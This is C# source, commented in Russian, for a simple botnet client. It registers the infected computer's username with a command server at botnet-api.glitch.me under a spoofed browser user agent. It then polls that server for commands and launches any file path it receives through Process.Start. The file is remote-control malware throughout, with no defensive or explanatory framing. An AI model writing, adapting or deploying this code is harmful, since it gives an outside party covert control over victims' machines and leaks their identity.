using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Web.Script.Serialization;
using System.Linq;

namespace CommandsLibrary
{
    class Client //Класс для создания клиента на апи
    {
        public uint id { get; set; }
        public string nameofpc { get; set; }
    }
    class Command //Класс для принятия команды
    {
        public string command { get; set; }
    }
    public class HttpCommands
    {
        public static async Task<Int32> createUserNameAndGetIdAsync()//Отправляет на API Имя текущего компьютера и получает уникальный Id
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            Client name = new Client
            {
                nameofpc = Environment.UserName
            };
            string json = new JavaScriptSerializer().Serialize(name);
            HttpResponseMessage response = await client.PostAsync("/api/client", new StringContent(json, Encoding.UTF8, "application/json"));
            int id = await response.Content.ReadAsAsync<int>();
            return id;
        }


        public static async Task<string> getCommandAssync(int idofpc) //Получает команду в соответствии с заданным id ПК и id комманды
        {
            HttpClient client = new HttpClient();
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            Command command = new Command();
            HttpResponseMessage response = await client.GetAsync($"/api/messages/{idofpc}");//Получение команды
            if (response.IsSuccessStatusCode)//Если команда есть
            {
                 command = await response.Content.ReadAsAsync<Command>();
                return command.command;
            }
            else
            {
                return command.command;
            }
        }
    }
    public class CommandsList
    {
        public static string startCommand(string path)
        {
            string[] pathArray = path.Split('\\');
            if (pathArray[0] == "%currentuser%")
            {
                string newpath = "C:\\Users\\" + Environment.UserName;
                for (int i = 1; i < pathArray.Length; i++)
                {
                    newpath += "\\" + pathArray[i];
                }
                Process.Start(newpath);
                return "Done!";
            }
            else
            {
                Process.Start(path);
                return "Done!";
            }
        }
        public static string nameofpcCommand()
        {
            return Environment.UserName;
        }
    }
    public class ClientCommands:CommandsList
    {
        public void splitCommand(string commandString)//Отделяет  название комманды от путей к файлам и их в том числе
        {
            string[] commandArray = commandString.Split(new char[] {'^'},StringSplitOptions.RemoveEmptyEntries);

            clientCommands(commandArray);
        }
        public string clientCommands(string[] commandArray) //Получает команду и напрявляет данные в нужный метод
        {
            switch (commandArray[0])
            {
                case "/start":
                    return startCommand(commandArray[1]);
                    break;
                case "/nameofpc":
                    return nameofpcCommand();
                    break;
                default:
                    return "Комманда введена неверно или отсутствует у клиента";
            }
        }
    }
}
